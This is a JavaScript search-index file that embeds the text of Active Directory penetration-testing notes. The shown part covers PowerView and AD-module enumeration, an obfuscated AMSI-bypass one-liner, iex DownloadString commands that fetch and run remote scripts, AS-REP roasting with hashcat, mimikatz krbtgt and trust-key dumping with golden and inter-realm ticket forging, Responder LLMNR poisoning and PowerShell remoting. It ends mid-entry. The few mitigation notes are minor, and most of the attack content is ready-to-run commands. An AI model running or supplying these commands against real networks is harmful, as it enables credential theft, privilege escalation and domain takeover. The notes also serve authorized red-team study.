var suggestions=document.getElementById('suggestions'),search=document.getElementById('search');search!==null&&document.addEventListener('keydown',inputFocus);function inputFocus(a){a.ctrlKey&&a.key==='/'&&(a.preventDefault(),search.focus()),a.key==='Escape'&&(search.blur(),suggestions.classList.add('d-none'))}document.addEventListener('click',function(a){var b=suggestions.contains(a.target);b||suggestions.classList.add('d-none')}),document.addEventListener('keydown',suggestionFocus);function suggestionFocus(c){const d=suggestions.classList.contains('d-none');if(d)return;const a=[...suggestions.querySelectorAll('a')];if(a.length===0)return;const b=a.indexOf(document.activeElement);if(c.key==="ArrowUp"){c.preventDefault();const d=b>0?b-1:0;a[d].focus()}else if(c.key==="ArrowDown"){c.preventDefault();const d=b+1<a.length?b+1:b;a[d].focus()}}(function(){var a=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:'id',store:["href","title","description"],index:["title","description","content"]}});a.add({id:0,href:"/active_directory/domain_enumeration/domains/",title:"Domains",description:"Enumerating domains.",content:"ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get current domain Get-ADDomain # Get object of another domain Get-ADDomain -Identity lab.local # Get domain SID for current domain (Get-ADDomain).DomainSID # Get domain controllers for current domain Get-ADDomainController # Get domain controllers for another domain Get-ADDomainController -DomainName lab.local -Discover PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get current domain Get-NetDomain # Get object of another domain Get-NetDomain -Domain lab.local # Get domain SID for current domain Get-DomainSID # Get domain policy for current domain Get-DomainPolicy (Get-DomainPolicy).\u0026#34;System Access\u0026#34; # Get domain policy for another domain # Password policy (Get-DomainPolicy -Domain lab.local).\u0026#34;System Access\u0026#34; # Kerberos policy for e.g. mimikatz golden tickets (Get-DomainPolicy -Domain lab.local).\u0026#34;Kerberos Policy\u0026#34; # Get domain controllers for current domain Get-NetDomainController # Get domain controllers for another domain Get-NetDomainController -Domain lab.local # enumerate all gobal catalogs in the forest Get-ForestGlobalCatalog # Turn a list of computer short names to FQDNs, using a global catalog gc computers.txt | % {Get-DomainComputer -SearchBase \u0026#34;GC://GLOBAL.CATALOG\u0026#34; -LDAP \u0026#34;(name=$_)\u0026#34; -Properties dnshostname} # Enumerate the current domain controller policy $DCPolicy = Get-DomainPolicy -Policy DC $DCPolicy.PrivilegeRights # user privilege rights on the dc... # Enumerate the current domain policy $DomainPolicy = Get-DomainPolicy -Domain bufu-sec.local $DomainPolicy.KerberosPolicy # useful for golden tickets ;) $DomainPolicy.SystemAccess # password age/etc. "}).add({id:1,href:"/active_directory/domain_enumeration/domain_users/",title:"Domain Users",description:"Enumerating domain users.",content:"ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get list of users in current domain Get-ADUser -Filter * -Properties * Get-ADUser -Identity student1 -Properties * Get-ADUser -Filter * -Properties * | Select Name # Get list of all properties for users in current domain Get-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | Select Name Get-ADUser -Filter * -Properties * | Select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} # Search for a particular string in a user\u0026#39;s attributes Get-ADUser -Filter \u0026#39;Description -Like \u0026#34;*built*\u0026#34;\u0026#39; -Properties Description | Select name,Description PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get list of users in current domain Get-NetUser Get-NetUser -Username student1 Get-NetUser | Select cn # Find all users with an SPN (likely service accounts) Get-DomainUser -SPN # Find all service accounts in \u0026#34;Domain Admins\u0026#34; Get-DomainUser -SPN | ?{$_.memberof -match \u0026#39;Domain Admins\u0026#39;} # Check for users who don\u0026#39;t have kerberos preauthentication set Get-DomainUser -PreauthNotRequired Get-DomainUser -UACFilter DONT_REQ_PREAUTH # Find users with sidHistory set Get-DomainUser -LDAPFilter \u0026#39;(sidHistory=*)\u0026#39; # Find any users with constrained delegation set Get-DomainUser -TrustedToAuth # Find all privileged users that aren\u0026#39;t marked as sensitive/not for delegation Get-DomainUser -AllowDelegation -AdminCount # Get list of all properties for users in current domain Get-UserProperty Get-UserProperty -Properties pwdlastset # Search for a particular string in a user\u0026#39;s attributes Find-UserField -SearchField Description -SearchTerm \u0026#34;built\u0026#34; # Get actively logged on users on a computer (needs local admin rights on the target) Get-NetLoggedOn -ComputerName dc.lab.local # Get actively logged on users on a computer (needs remote registry on the target - started by default on server OS) Get-LoggedOnLocal -ComputerName dc.lab.local # Get the last logged user on a computer (needs administrative rights and remote registry on the target) Get-LastLoggedOn -ComputerName dc.lab.local # Get all users with passwords changed \u0026gt; 1 year ago, returning sam account names and password last set times $Date = (Get-Date).AddYears(-1).ToFileTime() Get-DomainUser -LDAPFilter \u0026#34;(pwdlastset\u0026lt;=$Date)\u0026#34; -Properties samaccountname,pwdlastset # Get all enabled users, returning distinguishednames Get-DomainUser -LDAPFilter \u0026#34;(!userAccountControl:1.2.840.113556.1.4.803:=2)\u0026#34; -Properties distinguishedname Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname # Get all disabled users Get-DomainUser -LDAPFilter \u0026#34;(userAccountControl:1.2.840.113556.1.4.803:=2)\u0026#34; Get-DomainUser -UACFilter ACCOUNTDISABLE # Get all users that require smart card authentication Get-DomainUser -LDAPFilter \u0026#34;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)\u0026#34; Get-DomainUser -UACFilter SMARTCARD_REQUIRED # Get all users that *don\u0026#39;t* require smart card authentication, only returning sam account names Get-DomainUser -LDAPFilter \u0026#34;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)\u0026#34; -Properties samaccountname Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname # Use multiple identity types for any *-Domain* function \u0026#39;S-1-5-21-890171859-3433809279-3366196753-1114\u0026#39;, \u0026#39;CN=dfm,CN=Users,DC=testlab,DC=local\u0026#39;,\u0026#39;4c435dd7-dc58-4b14-9a5e-1fdb0e80d201\u0026#39;,\u0026#39;administrator\u0026#39; | Get-DomainUser -Properties samaccountname,lastlogoff # enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships # query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames $ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase \u0026#34;GC://testlab.local\u0026#34; -LDAPFilter \u0026#39;(objectclass=foreignSecurityPrincipal)\u0026#39; | ? {$_.objectsid -match \u0026#39;^S-1-5-.*-[1-9]\\d{2,}$\u0026#39;} | Select-Object -ExpandProperty distinguishedname $Domains = @{} $ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) { # extract the domain the foreign user was added to $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf(\u0026#39;DC=\u0026#39;)) -replace \u0026#39;DC=\u0026#39;,\u0026#39;\u0026#39; -replace \u0026#39;,\u0026#39;,\u0026#39;.\u0026#39; # check if we\u0026#39;ve already enumerated this domain if (-not $Domains[$ForeignUserDomain]) { $Domains[$ForeignUserDomain] = $True # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set $Filter = \u0026#34;(|(member=\u0026#34; + $($ForeignUsers -join \u0026#34;)(member=\u0026#34;) + \u0026#34;))\u0026#34; Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member } } $ForeignMemberships | fl  # if running in -sta mode, impersonate another credential a la \u0026#34;runas /netonly\u0026#34; $SecPassword = ConvertTo-SecureString \u0026#39;Password123!\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;TESTLAB\\dfm.a\u0026#39;, $SecPassword) Invoke-UserImpersonation -Credential $Cred # ... action Invoke-RevertToSelf # Set the specified property for the given user identity Set-DomainObject testuser -Set @{\u0026#39;mstsinitialprogram\u0026#39;=\u0026#39;\\\\EVIL\\program.exe\u0026#39;} -Verbose # Set the owner of \u0026#39;dfm\u0026#39; in the current domain to \u0026#39;harmj0y\u0026#39; Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y # retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync) Get-ObjectACL \u0026#34;DC=testlab,DC=local\u0026#34; -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match \u0026#39;GenericAll\u0026#39;) -or ($_.ObjectAceType -match \u0026#39;Replication-Get\u0026#39;) } # check if any user passwords are set $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter \u0026#39;(userPassword=*)\u0026#39; -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty \u0026#39;Password\u0026#39; \u0026#34;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))\u0026#34; -PassThru} | fl User Hunting # # Find all machines on the current domain where the current user has local admin access # This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine. # Can also be done using WMI and PowerShell Remoting # See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1 Find-LocalAdminAccess -Verbose # Find local admins on all machines of the domain (needs administrator privs on non-dc machines). # This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Get-NetLocalGroup on each machine. Invoke-EnumerateLocalAdmin -Verbose # Find computers where a domain admin (or specified user/group) has sessions # This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list of computers ( Get-NetComputer ) and list sessions and logged on users Get-NetSession/Get-NetLoggedon ) from each Invoke-UserHunter Invoke-UserHunter -GroupName \u0026#34;RDPUsers\u0026#34; # To confirm admin access Invoke-UserHunter -CheckAccess # Find computers where a domain admin is logged-in. # This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine. Invoke-UserHunter -Stealth # Find-DomainUserLocation == old Invoke-UserHunter # enumerate servers that allow unconstrained Kerberos delegation and show all users logged in Find-DomainUserLocation -ComputerUnconstrained -ShowAll # hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation Defending against User Hunting # NetCease #  Script to change permissions on NetSessionEnum method by removing permissions for Authenticated Users group Fails many of the attacker\u0026rsquo;s session enumeration and hence user hunting capabilities  .\\NetCease.ps1 SAMRi10 #  From same author as NetCease Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe) https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b  "}).add({id:2,href:"/active_directory/domain_privilege_escalation/as-rep_roasting/",title:"AS-REP Roasting",description:"Privilege escalation using AS-REP Roasting.",content:"Overview #  Dump krbasrep5 hashes of user accounts without Kerberos pre-authentication Users do not have to be service accounts Must have pre-authentication disabled Can request any authentication data (encrypted TGT) for any user since KDC skips validation Crack dumped hash with hashcat  Exploitation # Force Disable Kerberos Preauth # # Using PowerView 3.0/dev # Enumerate permissions for RDPUsers on ACLS Invoke-ACLScanner -ResolveGUIDS | ?{ $_.IdentityReferenceName -match \u0026#34;RDPUsers\u0026#34; } # Disable preauth for user Set-DomainObject -Identity Control572User -XOR @{useraccountcontrol=4194304} -Verbose Enumerate Users with Preauth Disabled # # Using PowerView 3.0/dev Get-DomainUser -PreauthNotRequired -Verbose | Select samaccountname # Using AD Module Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth # Query AS-REP-roastable users with impacket from Kali host # Supply userlist and don\u0026#39;t require authentication GetNPUsers.py -dc-ip 10.10.149.145 -no-pass -usersfile users.txt -format hashcat -outputfile hashes.asrep spookysec.local/ # Dump KRBASREP5 hash for specific user and output in hashcat format to file .\\Rubeus.exe asreproast /user:control572user /format:hashcat /outfile:control572user.asrep # Dump hashes with credentials using CrackMapExec crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 --asreproast output.txt # Transfer hash onto attacker and insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User..... # Crack hash with hashcat hashcat -a 0 -m 18200 hash.txt rockyou.txt Mitigation #  Strong password policy Enable Kerberos Pre-Authentication  Further Reading #  iRedTeam: AS-REP Roasting XPN: Kerberos AD Attacks - More Roasting with AS-REP harmj0y: Roasting AS-REPs  "}).add({id:3,href:"/active_directory/trust_attacks/cross_domain_attacks/",title:"Cross-Domain Attacks",description:"Cross-domain attacks.",content:"General #  Domains in the same forest have an implicit two-way trust relationship There is a trust key between the parent and child domains There are two ways of escalating privileges between two domains of the same forest  Krbtgt hash Trust tickets    Authentication Process for Resource in Different Domain #  Client requests TGT from DC in own domain DC sends back TGT Client shows TGT when requesting TGS for resource in another domain DC checks global catalog and finds resource in another domain DC sends back inter-realm TGT encrypted with Trust Key Client sends inter-realm TGT when requesting TGS for resource to DC of target domain DC checks if trust key is valid If yes, sends back TGS Client presents TGS when accessing target resource Target resource checks if client can access resource  Exploitation # Child to Forest Root using Trust Key #  Vulnerable step here is step 6, sending the TGT encrypted with trust key If we have the trust key, we can forge a ticket Escalate privileges from Domain Admin in current domain to Enterprise Admin or DA in forest root  Arguments #    Argument Description     kerberos::golden Module name   /domain:domain:dollarcorp.moneycorp.local FQDN of current domain   /sid:S-1-5-21-1874506631-3219952063-538504511 SID of the currentdomain   /User:Administrator User to impersonate   /target:moneycorp.local FQDN of the target/parent domain   /sids:S-1-5-21-280534878-1496970234-700767426-519 SID of the Enterprise Admins group of the parent/target domain   /rc4:200a7dab8e762344bd76a62acac42568 RC4 hash of the trust key   /ticket:trust_tgt.kirbi Save ticket to file for later use   /startoffset:0 Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future.   /endin:600 Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes   /renewmax:10080 Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800   /ptt Inject ticket in current PowerShell process    Commands # # Dump trust key from DC with mimikatz # Look for [In] trust key from child to parent Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::trust /patch\u0026#34;\u0026#39; -ComputerName dcorp-dc Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\mcorp$\u0026#34;\u0026#39; # Get SID of Enterprise Admins Group using PowerView 3.0 Get-DomainGroup -Domain moneycorp.local \u0026#34;Enterprise Admins\u0026#34; | Select objectsid # Forge inter-realm TGT Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /target:moneycorp.local /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:200a7dab8e762344bd76a62acac42568 /service:krbtgt /ticket:trust_key_tgt.kirbi\u0026#34;\u0026#39; # Use inter-realm ticket to get and use TGS for CIFS service on DC of the parent domain .\\Rubeus.exe asktgs /ticket:trust_key_tgt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt # Check access ls \\\\mcorp-dc.moneycorp.local\\c$ Child to Forest Root using krbtgt Hash #  Same principle as using trust key But: no need to explicitly request TGS for specific service Works like golden ticket  # Dump krbtgt hash with DA privileges Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\krbtgt\u0026#34;\u0026#39; # Forge inter-realm TGT Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:trust_krbtgt_tgt.kirbi\u0026#34;\u0026#39; # Avoid suspicious logs by using SID of Domain Controllers and Enterprise Domain Controllers # S-1-5-21 = Domain Controllers # S-1-5-9 = Enterprise Domain Controllers Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:dcorp-dc$ /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:trust_krbtgt_tgt.kirbi\u0026#34;\u0026#39; # Inject ticket into session Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt trust_krbtgt_tgt.kirbi\u0026#34;\u0026#39; "}).add({id:4,href:"/active_directory/general/general/",title:"General Information",description:"General information about Active Directory.",content:"Introduction #  Used to manage Windows domain networks \u0026ldquo;Phone book\u0026rdquo; for Windows -\u0026gt; stores information about computers, users, etc. Authentication uses Kerberos tickets Can be exploited using intended functionality  Physical AD Components #  Domain controller server -\u0026gt; AD DS server role installed Domain controllers  Host copy of AD DS directory store Provides authentication \u0026amp; authorization Replicate updates to other DCs in the domain and forest Administrative access to manage user accounts and network resources   AD DS data store  Contains db files and processes that store and manage directory information for users, services, and applications Consists of the Ntds.dit file Is stored by default in the %SystemRoot%\\NTDS folder on all DCs Accessible only through the DC processes and protocols    Logical AD Components #  AD DS schema Every type of object that can be stored Enforces rules for object creation \u0026amp; configuration     Object Types Function Examples     Class Object What objects can be created in the directory User, Computer   Attribute Object Information that can be attached to an object Display name    Domains #  Used to group and manage objects in an organization Administartive boundary for applying policies to groups and objects Replication boundary for replicating data between domain controllers Authentication \u0026amp; authorization boundary that provides a way to limit the scope of access to resources  Trees #  Hierarchy of domains in AD DS All domains in the tree  Share contiguous namepsace with parent domain Can have additional child domains By default create a two-way transitive trust with other domains    Forest #  Collection of one or more domain trees Share a common  schema configuration partition global catalog to enable searching   Enable trusts between all domains in the forest Share the Enterprise Admins and Schema Admins groups  Organization Units (OUs) #  AD containers that can contain users, groups, computer and other OUs Used to  Represent organization hierarchically and logically Manage a collection of objects in a consistent way Delegate permissions to administer groups of objects Apply policies   Separate components only for applying GP Don\u0026rsquo;t mix users and computers  Trusts #  Provide mecahnism for users to gain access to resources in antoher domain All domains in a forest trust all other domains in the forest Can extend outside the forest Types of trusts  Directional Transitive    Objects #  User InetOrgPerson Contacts Groups Computers Printers Shared folders  Flexible Single Master Operations (FSMO) Roles # Schema Master #  Performs updates to the AD schema such as ADPREP/FORESTPREP, MS Exchange Must be online during schema updates Generally placed on the forest root PDC  Domain Naming Master #  Adds and removes domains and application partitions to and from the AD forest Must be online when domains and application partitions in a forest are added or removed Generally placed on the forest root PDC  PDC Emulator #  Manages password changes for computer and user accounts on replica domain controllers Consulted by replica domain controllers where service authentication requests have mismatched passwords Target DC for Group Policy updates Usually also the single authorative time server Target DC for legacy applications that perform writable operations and for some admin tools Must be online and accessible at all times Generally placed on higher-performance hardware in a reliable hub site alongside other DCs  RID Master # Allocates active and standby RID pools to replica DCs in the same domain Must be online for newly-promoted DCs to obtain a local RID pool or when existing DCs must update their current or standby RID pool allocation Generally placed on the forest root PDC\nInfrastructure Master #  Updates cross-domain references and phantoms/tombstones from the Global Catalog A Separate infrastructure master is created for each application partition including the default forest-wide and domain-wide application partitions Can be placed on any DC in single-domain forest Generally placed on a DC that is not a Global Catalog in a multi-domain forest except when all DCs in the forest are Global Catalog then it can be placed on any DC  "}).add({id:5,href:"/active_directory/domain_persistence/golden_tickets/",title:"Golden Tickets",description:"Persistence methods using Golden Tickets.",content:"General #  Golden ticket is signed and ecrypted by hash of krbtgt account, making it a valid TGT ticket Since user account validation is not done by the DC/KDC until TGT is older than 20 minutes, we can use even deleted/revoked accounts krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine Password change has no effect on this attack  Exploitation # Arguments #    Argument Description     kerberos::golden Module name   /domain:domain:dollarcorp.moneycorp.local Domain FQDN   /sid:S-1-5-21-1874506631-3219952063-538504511 SID of the domain   /krbtgt:ff46a9d8bd66c6efd77603da26796f35 NTLM hash of the krbtgt account. Use /aes128 and /aes256 for using AES   /User:Administrator Username for which the TGT is generated   /id:500 /groups:512 Optional User RID (default 500) and Group default 513 512 520 518 519)   /startoffset:0 Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future.   /endin:600 Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes   /renewmax:10080 Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800   /ptt Inject ticket in current PowerShell process   /ticket Save ticket to file for later use    Commands # # Execute mimikatz on DC as DA to get krbtgt hash Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;dcorp-dc\u0026#34; # Use DCSync with DA privileges to get krbtgt hash Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\krbtgt\u0026#34;\u0026#39; # On any machine # Inject ticket into current PowerShell session Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /startoffset:0 /endin:600 /renewmax:10080 /ptt\u0026#34;\u0026#39; # Save ticket to file for later use Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /startoffset:0 /endin:600 /renewmax:10080 /ticket:krbtgt.kirbi\u0026#34;\u0026#39; # Get domain policy for tickets to set appropriate values (Get-DomainPolicy -Domain lab.local).\u0026#34;Kerberos Policy\u0026#34; # Use AES keys to avoid downgrading encryption and generating abnormal traffic/alerts Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /aes128:AES128KEY /aes256:AES256KEY /startoffset:0 /endin:600 /renewmax:10080 /ticket:krbtgt.kirbi\u0026#34;\u0026#39; # Inject ticket into current session Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt krbtgt.kirbi\u0026#34;\u0026#39; Executing Commands / Getting a Shell # # Inject ticket and open command prompt in current context Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt krbtgt.kirbi\u0026#34; \u0026#34;misc::cmd\u0026#34;\u0026#39; # Open command prompt on other machine PsExec.exe -AcceptEULA \\\\dcorp-dc cmd.exe # Run command using WMI gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local Detection #  Event IDs:  4624: Account Logon 4634: Account Logoff 4672: Admin Logon    Get-WinEvent -FilterHashtable @{Logname=\u0026#39;Security\u0026#39;;ID=4672} -MaxEvents 1 | Format-List -Property * "}).add({id:6,href:"/active_directory/mitm_relay/llmnr_poisoning/",title:"LLMNR Poisoning",description:"LLMNR Poisoning using Responder.",content:"What is LLMNR? #  Used to identify hosts when DNS fails Previously known as NBT-NS Key flaw: services utilize a user\u0026rsquo;s username and NTLMv2 hash when appropriately responded too  Attack Flow #  Trick victim into connecting to malicious server under our control Capture hash Service name cannot be resolvable over DNS  Exploitation # # Run responder python responder.py -I tun0 -rdwv # Crack hash with hashcat hashcat -a 0 -m 5600 hashes.txt rockyou.txt Mitigation #  Disable LLMNR and NBT-NS If the functions can\u0026rsquo;t be disabled, then  require Network Access Control require strong password policy    "}).add({id:7,href:"/active_directory/lateral_movement/ps_remoting/",title:"PowerShell Remoting",description:"Using PowerShell Remoting for lateral movement.",content:"General #  psexec on steroids, enabled by default from Server 2012 Might need to enable it on Desktop, admin privs required -\u0026gt; Enable-PSRemoting Opens elevated shell on target if admin creds used Two types:  One-to-one One-to-many    One-to-One - PSSession #  Interactive Runs in new process (wsmprovhost) Stateful  # Enter interactive prompt on remote system for one-time use Enter-PSSession -ComputerName ws01.lab.local # Enter previously created session $Sess = New-PSSession -ComputerName ws01.lab.local Enter-PSSession -Session $Sess # With credentials # With GUI access $cred = Get-Credential Enter-PSSession -ComputerName ws01.lab.local -Credential $cred # Without GUI access $password = ConvertTo-SecureString \u0026#34;MyPlainTextPassword\u0026#34; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential (\u0026#34;username\u0026#34;, $password) Enter-PSSession -ComputerName ws01.lab.local -Credential $cred # Create persistent environment on 